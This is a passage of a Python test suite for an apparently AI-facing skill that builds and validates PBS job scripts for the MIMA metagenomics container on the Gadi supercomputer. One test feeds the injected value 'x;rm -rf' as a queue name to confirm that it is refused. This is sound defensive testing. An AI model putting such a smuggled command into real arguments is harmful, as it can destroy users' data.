            self.assertNotIn("WARN", text)
            self.assertNotIn("NOTE", text)

    def test_never_overwrites(self):
        self.out.write_text("mine\n")
        code, d = self.hdr(*self.good(3), "--out", self.out, "--apply")
        self.assertEqual((code, d["status"]), (1, "needs_input"))
        self.assertEqual(self.out.read_text(), "mine\n")

    def test_missing_user_facts_are_asked_not_guessed(self):
        code, d = self.hdr("--module", "taxa", "--samples", 4)
        self.assertEqual((code, d["status"]), (1, "needs_input"))
        text = " ".join(d["needs_input"])
        for word in ("project", "container image", "folders"):
            self.assertIn(word, text)
        self.assertEqual(d["lines"], [])
        env = dict(self.env, PROJECT="ab01")  # $PROJECT is a real source, so it is used
        code, d = self.hdr(*[x for x in self.good(4) if x not in ("--project", "ab01")], env=env)
        self.assertEqual(d["status"], "prepared", d)

    def test_unmapped_storage_and_other_modules_are_refused(self):
        code, d = self.hdr("--module", "taxa", "--samples", 2, "--image", "/a.sif", "--project", "ab01", "--path", "/tmp/data")
        self.assertEqual(d["status"], "needs_input")
        self.assertIn("storage", " ".join(d["needs_input"]))
        for module in ("qc", "func"):
            code, d = self.hdr("--module", module, "--samples", 2, "--image", "/a.sif", "--project", "ab01", "--path", "/scratch/ab01/x")
            self.assertEqual((code, d["status"], d["lines"]), (1, "needs_input", []))
            self.assertIn("no sizing rule", d["needs_input"][0])

    def test_samples_counted_from_a_crlf_manifest(self):
        m = self.tmp / "manifest.csv"
        m.write_bytes(b"\xef\xbb\xbfsample,read1,read2\r\nA,a_1.fq.gz,a_2.fq.gz\r\nB,b_1.fq.gz,b_2.fq.gz\r\n\r\n")
        args = [x for x in self.good(1)]
        i = args.index("--samples")
        code, d = self.hdr(*(args[:i] + args[i + 2:]), "--manifest", m)
        self.assertEqual((d["status"], d["samples"]), ("prepared", 2))

    def test_unsafe_values_are_refused(self):
        code, d = self.hdr(*self.good(3), "--queue", "x;rm -rf")
        self.assertEqual(d["status"], "needs_input")
        code, d = self.hdr("--module", "taxa", "--samples", 3, "--image", "/a b.sif", "--project", "ab01", "--path", "/scratch/ab01/x")
        self.assertEqual(d["status"], "needs_input")


class TestSkillConsistency(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.skill_md = (SKILL / "SKILL.md").read_text()
        parts = cls.skill_md.split("---", 2); cls.front, cls.body = parts[1], parts[2]
        cls.md_files = [SKILL / "SKILL.md"] + sorted((SKILL / "references").glob("*.md")) + sorted((SKILL / "assets").glob("*.md"))

    def field(self, name):
        m = re.search(rf"^{name}:\s*(.+)$", self.front, re.M); return m.group(1).strip() if m else None

    def test_guide_frontmatter_rules(self):
        name = self.field("name"); self.assertRegex(name, r"^[a-z0-9]+(-[a-z0-9]+)*$"); self.assertEqual(name, SKILL.name)
        self.assertNotRegex(name, r"claude|anthropic")
        desc = self.field("description"); self.assertLess(len(desc), 1024); self.assertTrue(len(desc) > 100)
        self.assertNotIn("<", self.front); self.assertNotIn(">", self.front)
        self.assertRegex(desc, r"[Uu]se whenever|[Uu]se when", "description must say WHEN to use the skill")
        self.assertIn("Do NOT use", desc, "description should carry negative triggers")
        self.assertTrue(1 <= len(self.field("compatibility")) <= 500)

    def test_guide_structure_rules(self):
        self.assertTrue((SKILL / "SKILL.md").is_file()); self.assertFalse((SKILL / "README.md").exists())
        self.assertLess(len(self.skill_md.split()), 5000)
        for needed in ("## Critical rules", "## Instructions", "## Examples", "Troubleshooting"):
            self.assertIn(needed, self.body)
        self.assertLess(self.body.find("## Critical rules"), 3000, "critical instructions belong near the top")

    def test_every_file_is_non_empty_and_every_reference_resolves(self):
        for f in SKILL.rglob("*"):
            if f.is_file(): self.assertGreater(f.stat().st_size, 0, f"empty file: {f}")
        for md in self.md_files:
            for p in re.findall(r"`((?:scripts|references|assets)/[A-Za-z0-9_./-]+)`", md.read_text()):
                if "*" not in p and not p.endswith("/"): self.assertTrue((SKILL / p).exists(), f"{md.name} cites missing {p}")

    def test_every_script_and_reference_is_reachable_from_skill_md(self):
        for f in sorted(SC.glob("*.py")) + sorted((SKILL / "references").glob("*.md")) + sorted((SKILL / "assets").glob("*.md")):
            rel = f.relative_to(SKILL).as_posix()
            self.assertIn(rel, self.skill_md, f"{rel} is not mentioned in SKILL.md, so Claude would never find it") if f.name != "generate_module_docs.py" else None
        self.assertIn("generate_module_docs.py", self.skill_md)

    def test_no_angle_brackets_in_markdown_or_json(self):
        for f in self.md_files + sorted(SC.glob("*.json")):
            self.assertIsNone(re.search(r"<[^>\s]{1,40}>", f.read_text()), f"angle-bracket placeholder in {f.name}")

    def test_no_stale_scope_statements(self):
        # phrases that describe the skill as a whole as lacking submission or monitoring (true only of v1)
        stale = [r"not included in this version", r"not submitted or monitored", r"planned for a later version",
                 r"later version of this skill", r"this version (?:generates|does not)", r"skill (?:does not|doesn't) (?:yet )?(?:submit|monitor)"]
        for f in self.md_files:
            for pat in stale: self.assertIsNone(re.search(pat, f.read_text(), re.I), f"stale v1 wording {pat!r} in {f.name}")

    def test_module_parameter_doc_matches_spec(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(SKILL, tmp / "s"); (tmp / "s/references/module-parameters.md").unlink()
            subprocess.run([PY, str(tmp / "s/scripts/generate_module_docs.py")], check=True, capture_output=True)
            self.assertEqual((tmp / "s/references/module-parameters.md").read_text(), (SKILL / "references/module-parameters.md").read_text(),
                             "module-parameters.md is out of date: run scripts/generate_module_docs.py")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_scripts_use_only_standard_library_and_python36_syntax(self):
        """Gadi's default python3 is 3.6.8 (seen 2026-10-14), so the scripts must run there.

        An earlier version of this test targeted 3.7 and missed subprocess.run(capture_output=..., text=...),
        which is 3.7-only; it is now in the deny list and vermin is run when installed.
        """
        std = set(sys.stdlib_module_names) if hasattr(sys, "stdlib_module_names") else None
        later_api = ("shlex.join", "removeprefix", "removesuffix", "math.prod", "functools.cache", "missing_ok", "graphlib",
                     "capture_output", "text=True", "from __future__ import annotations", "dataclasses", "fromisoformat",
                     "time_ns", "nullcontext", "isascii", "breakpoint(")  # walrus and other new syntax are caught by ast.parse(feature_version=(3, 6))
        for f in sorted(SC.glob("*.py")):
            src = f.read_text(); tree = ast.parse(src, feature_version=(3, 6))
            for node in ast.walk(tree):
                mods = [a.name.split(".")[0] for a in node.names] if isinstance(node, ast.Import) else ([node.module.split(".")[0]] if isinstance(node, ast.ImportFrom) and node.module and node.level == 0 else [])
                for m in mods:
                    local = (SC / f"{m}.py").exists()
                    if std is not None: self.assertTrue(m in std or local, f"{f.name} imports non-standard module {m}")
            for api in later_api:
                if api in src: self.fail(f"{f.name} uses {api}, newer than Python 3.6")

    @unittest.skipUnless(shutil.which("vermin"), "vermin is not installed (pip install vermin)")
    def test_vermin_reports_no_newer_than_python36_for_every_script(self):
        for f in sorted(SC.glob("*.py")):
            out = subprocess.run(["vermin", "--no-tips", "--eval-annotations", str(f)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True).stdout
            m = re.search(r"Minimum required versions: (\d+)\.(\d+)", out)
            self.assertTrue(m and (int(m.group(1)), int(m.group(2))) <= (3, 6), f"{f.name} needs newer than Python 3.6: {out[-300:]}")

    def test_specs_and_patterns_are_valid_json_and_modules_documented(self):
        spec = json.loads((SC / "command_specs.json").read_text())["modules"]
        doc = (SKILL / "references/module-parameters.md").read_text()
        for m in spec: self.assertIn(f"## {m}", doc)
        for m in spec:
            self.assertIn(spec[m]["style"], ("options", "positional", "template"))
            for p, ps in spec[m]["params"].items(): self.assertIn("type", ps, f"{m} {p}")

    def test_version_is_declared(self):
        self.assertRegex(self.front, r"version:\s*\d+\.\d+\.\d+")


class TestRealGadiScript(unittest.TestCase):
    """The taxonomy PBS script a real MIMA generator wrote on Gadi (tutorial run, rebuilt from the user's
    `head` and `grep` output on 2026-10-14). It exports IMAGE_DIR; an earlier validator only accepted a bare
    `IMAGE_DIR=` and reported 'IMAGE_DIR is not set' for it, a false positive that no mock script had exposed."""
    FIXTURE = HERE / "container_check" / "fixtures" / "real_run_taxa_profiling.pbs"

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def validate(self, text, name="run_taxa_profiling.pbs"):
        p = write(self.tmp / name, text)
        return run("validate_pbs_scripts.py", p)

    def test_real_script_with_exported_image_dir_is_valid(self):
        rc, out = self.validate(self.FIXTURE.read_text())
        self.assertEqual(rc, 0, out)
        self.assertNotIn("IMAGE_DIR", out)

    def test_plain_and_exported_assignments_are_both_accepted(self):
        base = self.FIXTURE.read_text()
        for form in ("IMAGE_DIR=/g/data/mp96/x.sif", 'export IMAGE_DIR="/g/data/mp96/x.sif"', "declare -x IMAGE_DIR=/g/data/mp96/x.sif"):
            text = re.sub(r"^export IMAGE_DIR=.*$", form, base, flags=re.M)
            rc, out = self.validate(text)
            self.assertNotIn("IMAGE_DIR is", out, form)

    def test_missing_or_empty_image_dir_is_still_an_error(self):
        base = self.FIXTURE.read_text()
        missing = re.sub(r"^export IMAGE_DIR=.*$", "", base, flags=re.M)
        rc, out = self.validate(missing)
        self.assertEqual(rc, 1); self.assertIn("IMAGE_DIR is not set", out)
        for empty in ("export IMAGE_DIR=", 'export IMAGE_DIR=""', "IMAGE_DIR="):
            rc, out = self.validate(re.sub(r"^export IMAGE_DIR=.*$", empty, base, flags=re.M))
            self.assertEqual(rc, 1, empty); self.assertIn("IMAGE_DIR is empty", out, empty)

    def test_config_validator_accepts_exported_image_dir(self):
        cfg = "\n".join(line for line in self.FIXTURE.read_text().splitlines()[:17]) + "\n"
        p = write(self.tmp / "pbs_header_taxa.cfg", cfg)
        rc, out = run("validate_pbs_config.py", p, "--module", "taxa")
        self.assertNotIn("IMAGE_DIR", out, out)
        bad = write(self.tmp / "bad.cfg", cfg.replace("export IMAGE_DIR=/g/data/mp96/mima4_v2.0.0_20240409.sif", "export IMAGE_DIR="))
        rc, out = run("validate_pbs_config.py", bad, "--module", "taxa")
        self.assertEqual(rc, 1); self.assertIn("IMAGE_DIR", out)


class TestHelpComparator(unittest.TestCase):
    """container_check/compare_help_to_spec.py: does the spec match the container's own --help?

    The fixture is real --help text captured on Gadi (container mima4_v2.0.0_20240409,
    2026-10-07). The mutation tests prove the comparator reports each kind of mismatch,
    so a clean result on the real spec is a meaningful result.
    """
    FIXTURE = HERE / "container_check" / "fixtures" / "real_help_2026-10-07.txt"

    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, str(HERE / "container_check"))
        import compare_help_to_spec as c
        cls.c = c
        cls.spec = json.loads((SC / "command_specs.json").read_text())
        cls.helps = c.load_help(str(cls.FIXTURE))

    def compare(self, module, mutate=None, helps=None):
        spec = json.loads(json.dumps(self.spec))["modules"][module]
        if mutate:
            mutate(spec)
        text = (helps or self.helps).get(module)
        return self.c.compare_module(module, spec, self.c.parse_help(text))

    def errors(self, findings):
        return [m for s, m in findings if s == "ERROR"]

    def test_real_spec_matches_real_help_for_every_module(self):
        for module in self.spec["modules"]:
            self.assertEqual(self.errors(self.compare(module)), [], module)

    def test_all_eight_apps_were_parsed(self):
        self.assertEqual(len(self.helps), 8)
        for app, text in self.helps.items():
            doc = self.c.parse_help(text)
            self.assertTrue(doc.options or doc.positional, f"{app}: nothing parsed")

    def test_required_flags_read_from_usage_line(self):
        doc = self.c.parse_help(self.helps["mima-visualisation"])
        req = {o.name for o in doc.options if o.required}
        self.assertEqual(req, {"--feature-table", "--metadata", "--study-groups", "--output-dir"})
        qc = self.c.parse_help(self.helps["mima-qc"])
        self.assertEqual({o.name for o in qc.options if o.required}, {"--input-dir", "--output-dir", "--manifest"})
        taxa = {o.name: o for o in self.c.parse_help(self.helps["mima-taxa-profiling"]).options}
        self.assertTrue(taxa["--reference-path"].required)
        self.assertFalse(taxa["--read-length"].required, "usage line brackets it even though --help files it under Required")

    def test_choices_defaults_and_multi_value_are_read(self):
        qc = {o.name: o for o in self.c.parse_help(self.helps["mima-qc"]).options}
        self.assertEqual(qc["--mode"].choices, ["single", "container"])
        self.assertEqual(qc["--mode"].default, "container")
        self.assertEqual(qc["--walltime"].default, "2")
        vis = {o.name: o for o in self.c.parse_help(self.helps["mima-visualisation"]).options}
        self.assertTrue(vis["--feature-table"].multi)
        self.assertFalse(vis["--plot-insignificant"].takes_value)

    def test_flag_missing_from_container_is_an_error(self):
        out = self.compare("mima-qc", lambda m: m["params"].update({"--made-up": {"type": "int"}}))
        self.assertTrue(any("--made-up" in e for e in self.errors(out)))

    def test_changed_choices_are_an_error(self):
        out = self.compare("mima-qc", lambda m: m["params"]["--mode"].update({"choices": ["container", "batch"]}))
        self.assertTrue(any("--mode" in e and "choices" in e for e in self.errors(out)))

    def test_changed_default_is_an_error(self):
        out = self.compare("mima-qc", lambda m: m["params"]["--num-pbs-jobs"].update({"default": 9}))
        self.assertTrue(any("--num-pbs-jobs" in e and "default" in e for e in self.errors(out)))
        out = self.compare("mima-taxa-profiling", lambda m: m["params"]["--threshold"].update({"default": 100}))
        self.assertTrue(any("--threshold" in e for e in self.errors(out)), "spec 100 vs --help [default=1000] must be reported")

    def test_container_required_option_left_optional_in_spec_is_an_error(self):
        out = self.compare("mima-visualisation", lambda m: m["params"]["--metadata"].pop("required"))
        self.assertTrue(any("--metadata" in e and "required" in e for e in self.errors(out)))

    def test_value_versus_flag_and_multi_mismatches_are_errors(self):
        out = self.compare("mima-visualisation", lambda m: m["params"]["--feature-table"].update({"type": "abs_file_in"}))
        self.assertTrue(any("--feature-table" in e and "multi" in e for e in self.errors(out)))
        out = self.compare("mima-visualisation", lambda m: m["params"]["--plot-insignificant"].update({"type": "int"}))
        self.assertTrue(any("--plot-insignificant" in e for e in self.errors(out)))

    def test_positional_count_mismatch_is_an_error(self):
        out = self.compare("mima-vis-taxa", lambda m: m["params"].pop("top_n", None) or m["params"].pop(list(m["params"])[-1]))
        self.assertTrue(any("positional" in e for e in self.errors(out)))

    def test_container_option_missing_from_spec_is_reported(self):
        out = self.compare("mima-qc")
        self.assertTrue(any(s == "WARN" and "--email" in m for s, m in out))
        out = self.compare("mima-visualisation", lambda m: m["params"].pop("--output-dir"))
        self.assertTrue(any(s == "ERROR" and "--output-dir" in m for s, m in out), "a missing required option is an error")

    def test_policy_stricter_than_help_is_a_note_not_an_error(self):
        out = self.compare("mima-qc")
        self.assertTrue(any(s == "NOTE" and "--ref" in m and "policy" in m for s, m in out))
        out = self.compare("mima-taxa-profiling")
        self.assertTrue(any(s == "NOTE" and "--read-length" in m and "no choices" in m for s, m in out))

    def test_metaphlan_options_single_string_is_recorded_not_hidden(self):
        spec = self.spec["modules"]["mima-function-profiling"]["params"]["--metaphlan-options"]
        self.assertTrue(spec.get("multi_value_as_one_string"))
        out = self.compare("mima-function-profiling", lambda m: m["params"]["--metaphlan-options"].pop("multi_value_as_one_string"))
        self.assertTrue(any("--metaphlan-options" in e and "multi" in e for e in self.errors(out)),
                        "without the explicit marker the list-versus-string difference must be reported")

    def test_non_breaking_spaces_from_copy_paste_are_handled(self):
        text = self.FIXTURE.read_text().replace("  ", " \u00a0")
        helps = self.c.split_apps(self.c.normalise(text))
        self.assertEqual(self.errors(self.compare("mima-qc", helps=helps)), [])

    def test_capture_directory_layout_is_read(self):
        d = Path(tempfile.mkdtemp())
        try:
            for app, text in self.helps.items():
                (d / f"{app}.txt").write_text(text)
            (d / "_capture_info.txt").write_text("host: test\n")
            loaded = self.c.load_help(str(d))
            self.assertEqual(set(loaded), set(self.helps))
            rc = subprocess.run([PY, str(HERE / "container_check" / "compare_help_to_spec.py"), str(d), "--spec", str(SC / "command_specs.json")],
                                capture_output=True, text=True).returncode
            self.assertEqual(rc, 0)
        finally:
            shutil.rmtree(d, ignore_errors=True)

    def test_exit_code_one_when_spec_is_wrong(self):
        d = Path(tempfile.mkdtemp())
        try:
            bad = json.loads(json.dumps(self.spec))
            bad["modules"]["mima-qc"]["params"]["--nonexistent"] = {"type": "int"}
            spec_path = d / "bad_spec.json"; spec_path.write_text(json.dumps(bad))
            r = subprocess.run([PY, str(HERE / "container_check" / "compare_help_to_spec.py"), str(self.FIXTURE), "--spec", str(spec_path)],
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 1)
            self.assertIn("--nonexistent", r.stdout)
        finally:
            shutil.rmtree(d, ignore_errors=True)

    def test_unreadable_input_exits_two(self):
        r = subprocess.run([PY, str(HERE / "container_check" / "compare_help_to_spec.py"), "/no/such/path.txt"], capture_output=True, text=True)
        self.assertEqual(r.returncode, 2)

    def test_capture_script_refuses_missing_image(self):
        r = subprocess.run(["bash", str(HERE / "container_check" / "capture_container_help.sh"), "/no/such.sif"], capture_output=True, text=True)
        self.assertEqual(r.returncode, 2)
        self.assertIn("does not exist", r.stderr)


if __name__ == "__main__":
    unittest.main(verbosity=2)
